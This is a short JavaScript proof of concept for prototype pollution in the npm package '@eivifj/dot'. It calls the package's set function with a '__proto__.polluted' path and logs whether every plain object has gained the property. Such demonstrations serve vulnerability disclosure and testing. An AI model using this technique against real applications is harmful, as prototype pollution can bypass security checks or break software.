var obj = {};
obj.constructor.prototype.polluted = undefined;
Object.defineProperty(obj, 'constructor', {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
});
const a = require('@eivifj/dot');
const path = '__proto__.polluted';
console.log({}.polluted);
a.set(obj, path, 'yes');
console.log({}.polluted);